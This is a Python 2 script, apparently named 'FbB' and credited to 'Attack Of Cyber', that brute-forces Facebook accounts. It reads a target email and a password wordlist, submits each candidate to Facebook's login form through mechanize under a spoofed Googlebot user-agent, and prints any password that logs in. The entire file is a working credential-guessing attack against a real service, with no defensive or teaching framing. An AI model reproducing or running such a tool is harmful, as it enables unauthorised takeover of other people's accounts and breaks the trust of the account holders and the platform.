#!usr/bin/python
# -*- coding: utf-8 -*-
import sys
import random
import mechanize
import cookielib
import os

os.system("clear")
class bcolors:
    OKGREEN = '\033[92m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    OKBLUE = '\033[94m'

print bcolors.BOLD + ''
print '\t    _____ _     ____'
print '\t    |  ___| |__ | __ )'
print '\t    | |_  |  _ \|  _ \ '
print '\t    |  _| | |_) | |_) |'
print '\t    |_|   |_.__/|____/ '
print '\t '
print '\t _______________________________'
print '\t   📌 INFO!!! 📌 '
print '\t  {•} Creadby : root@M3e.X '
print '\t  {•} Team    : Attack Of Cyber'
print '\t  {•} Tools   : FbB '
print '\t _______________________________'
print '' + bcolors.ENDC

email = str(raw_input("{!} Your Email or username {•}> "))
passwordlist = str(raw_input("{!} Your Wordlist {•}> "))

useragents = [('User-agent', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')]

login = 'https://www.facebook.com/login.php?login_attempt=1'
def attack(password):

  try:
     sys.stdout.write("\r [!] Sedang Menguji Password: %s " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)


     ##Facebook
     br.form['email'] =email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
     if log != login:
        print bcolors.OKGREEN + "\n\n\n [!] Password Ditemukan!!!." + bcolors.ENDC

        print bcolors.WARNING + "\n [*] Password: %s\n" % (password) + bcolors.ENDC

        sys.exit(1)
  except KeyboardInterrupt:
        print bcolors.FAIL + "\n{•}> Exit......... " + bcolors.ENDC

        sys.exit(1)

def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))



def check():

    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

    except KeyboardInterrupt:
        print bcolors.FAIL + "\n{•}> Exit......... " + bcolors.ENDC

        sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print bcolors.FAIL + "\n [!] Error: Wordlist Not Found! \n"

        sys.exit(1)
    except KeyboardInterrupt:
        print bcolors.FAIL + "\n{•}> Exit......\n " + bcolors.ENDC

        sys.exit(1)
    try:
        print bcolors.OKBLUE + " [*] Informasi Akun : %s" % (email) + bcolors.ENDC

        print " [!] Jumlah Kata Sandi :" , len(passwords), "passwords"

        print " [!] Sedang Mencari Silakan Tunggu........"
    except KeyboardInterrupt:
        print bcolors.FAIL + "\n{•}> Exit.....\n " + bcolors.ENDC

        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print bcolors.FAIL + "\n{•}> Exit......\n" + bcolors.ENDC

        sys.exit(1)

if __name__ == '__main__':
    check()
